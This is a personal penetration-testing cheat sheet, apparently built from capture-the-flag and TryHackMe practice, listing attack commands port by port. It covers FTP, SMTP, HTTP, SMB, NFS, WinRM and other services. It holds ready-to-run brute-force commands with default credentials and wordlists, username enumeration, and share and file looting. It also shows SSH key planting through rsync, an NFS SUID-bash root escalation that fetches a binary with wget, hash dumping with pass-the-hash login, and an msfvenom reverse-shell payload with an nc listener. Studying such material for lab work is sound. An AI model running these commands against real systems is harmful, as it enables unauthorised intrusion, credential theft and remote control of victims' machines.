# Enumeration

## **stopped at skynet**

## **Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

Even longer scan

**Kali**

```
nmap -sC -sV -p- $VICTIM
```

## **Ports**

## TCP/21 - **FTP**

### **Common Credentials**

#### Usernames

```
anonymous
admin
guest
```

#### Passwords

```
anonymous
password
guest
```

### Access FTP

**Kali**

```
ftp $VICTIM 21
```

### List files

**Kali(ftp)**

```
ls
```

#### List files (using Curl)

**Kali**

```
curl ftp://anonymous:anonymous@$VICTIM:21
```



### Download  files

Change to Binary mode & passive (an important setting if you're uploading/downloading binary files like pictures and/or executables!).

**Kali(ftp)**

```
binary
passive
```

**Kali(ftp)**

```
get $fileName.txt
```

#### Download all files

**Kali(ftp)**

```
mget *
```

#### Download all files to the current directory (using Wget)

**Kali**

```
wget -m ftp://anonymous:anonymous@$VICTIM:21 -nd
```

### Upload files

Change to Binary mode & passive (an important setting if you're uploading/downloading binary files like pictures and/or executables!).

**Kali(ftp)**

```
binary
passive
```

**Kali(ftp)**

```
put file.txt
```



### **TCP/21 - SSH**

**Kali**

```
hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt  ssh://$VICTIM
```

### **TCP/25 - SMTP**

**Kali**

```
telnet $VICTIM25
HELO
VRFY root
QUIT
```

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-commands 
```

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -
```

**Kali**

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $VICTIM
```

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
```

### **TCP/80:443 - HTTP(s)**

Add things from this room: [https://tryhackme.com/room/contentdiscovery](https://tryhackme.com/room/contentdiscovery)

```
dirb http://$VICTIM
dirb http://$VICTIM:$PORT/ -o scans/$VICTIM-dirb-$PORT-common
dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
```



### Find Directories

This looks for all php files under folder cvs

**Kali**

```
ffuf -u http://$VICTIM/cvs/FUZZ.php -w /usr/share/wfuzz/wordlist/general/common.txt
```

#### Find folders

**Kali**

```
gobuster dir --url http://$VICTIM/ -w /usr/share/dirb/wordlists/big.txt -l
```

**Kali**

```
ffuf -u http://$VICTIM/static/FUZZ -w /usr/share/dirb/wordlists/big.txt
```

**Kali**

```
dirsearch -u $VICTIM:$PORT 
```

Nikto Tuning (-T) Options

```
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)
```

Scan for misconfigurations.

```
nikto -h $VICTIM -T 2 -Format txt 
```

Scan for SQL injection vulnerabilities.

```
nikto -h $VICTIM -T 9 -Format txt 
```

Check if the target is vulnerable to Shellshock

```
nmap -p 80 $VICTIM --script http-shellshock 
```

Check if the target is vulnerable to Heartbleed

```
nmap -p 443  $VICTIM --script ssl-heartbleed
```



Check if these files exist to gather info

```
http://$VICTIM/robots.txt
http://$VICTIM/sitemap.xml
```

#### &#x20;Username Enumeration

Example on how to find existing usernames from a website. Command would need to be adjusted to work with the webpage and at least one other user account must be known to know the corrector error message.

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://$VICTIM/customers/signup -mr "username already exists" -o users.csv -of csv
```

#### Brute Force

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$VICTIM/customers/login -fc 200
```



### UDP/88 - Kerberos

#### Username Enumeration

```
kerbrute/dist/kerbrute_linux_386 userenum --dc=$VICTIM -d=$commonName $ListOfUsernames.txt
```

### **TCP/110 - POP3**

```
telnet $VICTIM 110
USER root
PASS root
RETR 1
QUIT
```

### **TCP/135 - RPC**

```
rpcclient -U '' $VICTIM
srvinfo
netshareenum # print the real file-path of shares; good for accurate RCE
```

### **TCP/139 - NetBIOS**

```
nbtscan $VICTIM
enum4linux $VICTIM
```



### **TCP/445  - SMB**

**List Shares**

**Kali**

```
smbclient -L //$VICTIM/ 
```

#### List shares on a non-stanadrd SMB/Samba port

**Kali**

```
smbclient -L //$VICTIM/ -p $PORT 
```

#### Download files&#x20;

**Kali**

<pre><code><strong>cd loot
</strong>smbclient \\\\$VICTIM\\$SHARE
prompt
mget *
</code></pre>

? The SMB shares discovered have the following permissions

**Kali**

```
smbmap -H $VICTIM
smbmap -H $VICTIM-P $PORT
```

Download files

**Kali**

```
smbget -R smb://$VICTIM/$SHARE
smbget -R smb://$VICTIM:$PORT/$SHARE
```

### Detect Vulnerabilities

```
# check if vulnerable to EternalBlue
sudo nmap $VICTIM -p445 --script smb-vuln-ms17-010 
```

```
# check if vulnerable to SambaCry
sudo nmap $VICTIM -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version
```

### **TCP/667 - IRC**

```
irssi -c $VICTIM -p $PORT
```

### **TCP/873 - RSYNC**

```
sudo nmap $VICTIM -p873 --script rsync-list-modules
rsync -av rsync://$VICTIM/$SHARE --list-only
rsync -av rsync://$VICTIM/$SHARE loot
```

### **TCP/2049 - NFS**

<pre><code><strong>sudo nmap $VICTIM -p111 --script-nfs*
</strong></code></pre>

```
#This will list some folders hopefully
showmount -e $VICTIM
#Make a dir
mkdir /mnt/nfs
#/opt/conf is just an example, put what came out after showmount
mount $VICTIM:/opt/conf /mnt/nfs
cd /mnt/nfs
```

**Upload ID\_RSA key to login**

```
ssh-keygen -t rsa
cp ~/.ssh/id_rsa.pub authorized_keys
rsync authorized_keys rsync://rsync-connect@$VICTIM/files/sys-internal/.ssh
Password: pass

ssh $USERNAME@$VICTIM
```

**Create mount**

```
sudo mkdir /mnt/FOO
mount -t nfs $VICTIM:$SHARE /tmp/mount/ -nolock
sudo mount //$VICTIM:/$SHARE /mnt/FOO
```

**Interesting loot to look for**

<pre><code><strong>- id_rsa from users home directories
</strong></code></pre>

**Privilege Escalation**

Example of how you can get root shell. All commands except the last one are run on our Kali machine where we can control the permissions fully. Then we just run the exploit as the normal user we already have access to.

```
#Download exploit
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

mv bash /mount/point
chown root /mount/point/bash
chmod +u /mount/point/bash
chmod +d /mount/point/bash

#SSH in as victim and run the following
/mount/point/bash -p
```

### **TCP/3306 - SQL**

```
mysql -u $USER -h $VICTIM
```

### **TCP/3389 - RDP**

```
sudo nmap $VICTIM -p3389 --script rdp-ntlm-info 
```

```
rdesktop -u administrator $VICTIM
```

### **TCP/5327 - Postgres**

```
psql -U postgres -p 5437 -h $VICTIM # postgres:postgres
SELECT pg_ls_dir('/');
```

### **TCP/5985 - WinRM**

Login with found username and password

```
evil-winrm -u $USER -p $PASSWORD -i $VICTIM
```

Login with found username and hash

```
evil-winrm -i $VICTIM -u $VICTIMUSERNAME  -H $FOUNDHASH
```

Dump hashes of other users if the user you have access to has the privilege's to do so. If it does we can potentially use these hashes with evil-winrm to login as these other users.

```
python3 secretsdump.py  $DOMAIN/$USERNAME:$PASSWORD@$VICTIM
```

### TCP/7070 - AnyConnect

**Exploit:** [https://www.exploit-db.com/raw/49613](https://www.exploit-db.com/raw/49613)

For code above and just had to change the shellcode and ip variable.

**Kali**

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
```

**Kali**

```
nc -lvnp 4444
```

###

####

\
